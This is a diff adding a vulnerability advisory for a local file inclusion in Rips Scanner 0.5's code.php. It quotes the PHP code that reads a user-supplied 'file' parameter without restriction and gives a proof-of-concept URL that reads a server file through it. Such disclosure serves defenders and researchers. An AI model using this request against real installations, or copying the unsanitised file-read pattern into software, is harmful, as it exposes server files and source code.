@@ -1,0 +1,53 @@
+================================================================================
+# Rips Scanner 0.5 - (code.php) Local File Inclusion
+================================================================================
+# Vendor Homepage: https://github.com/robocoder/rips-scanner
+# Date: 24/12/2015
+# Software Link: https://github.com/robocoder/rips-scanner/archive/master.zip
+# Version : 0.5
+# Author: Ashiyane Digital Security Team
+# Contact: hehsan979@gmail.com
+# Source: http://ehsansec.ir/advisories/rips-code-lfi.txt
+================================================================================
+# Vulnerable File : code.php
+
+# Vulnerable Code:
+
+	
+102	$file = $_GET['file'];
+103	$marklines = explode(',', $_GET['lines']);
+104	$ext = '.'.pathinfo($file, PATHINFO_EXTENSION);
+105
+106	
+107	if(!empty($file) && is_file($file) && in_array($ext, $FILETYPES))
+108	{
+109		$lines = file($file);
+110		
+111		// place line numbers in extra table for more elegant copy/paste
+without line numbers
+112		echo '<tr><td><table>';
+113		for($i=1, $max=count($lines); $i<=$max;$i++)
+114			echo "<tr><td class=\"linenrcolumn\"><span
+class=\"linenr\">$i</span><A id='".($i+2).'\'></A></td></tr>';
+115		echo '</table></td><td id="codeonly"><table id="codetable" width="100%">';
+116		
+117		$in_comment = false;
+118		for($i=0; $i<$max; $i++)
+119		{				
+120			$in_comment = highlightline($lines[$i], $i+1, $marklines, $in_comment);
+121		}
+122	} else
+123	{
+124		echo '<tr><td>Invalid file specified.</td></tr>';
+125	}
+
+
+# PoC :
+
+http://localhost/rips/windows/code.php?file=/var/www/html/index.php
+
+Vulnerable Parameter : file
+
+================================================================================
+# Discovered By : Ehsan Hosseini (EhsanSec.ir)
+================================================================================
